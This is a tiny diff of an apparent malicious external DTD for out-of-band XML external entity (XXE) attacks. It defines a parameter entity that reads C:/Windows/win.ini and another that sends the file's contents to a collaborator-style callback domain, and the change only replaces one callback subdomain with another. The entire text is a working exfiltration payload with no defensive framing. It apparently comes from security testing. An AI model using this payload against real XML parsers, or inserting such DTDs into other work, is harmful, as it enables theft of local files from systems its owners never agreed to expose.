@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
-<!ENTITY % all "<!ENTITY send SYSTEM 'https://sqmxsnew1wxjs1941b5oxrso1f76vv.cigitalcollaborator.com/?collect=%file;'>">
+<!ENTITY % all "<!ENTITY send SYSTEM 'https://kpdprfdo0owbrt8w034gwjrg076zuo.cigitalcollaborator.com/?collect=%file;'>">
 %all;
 %send;
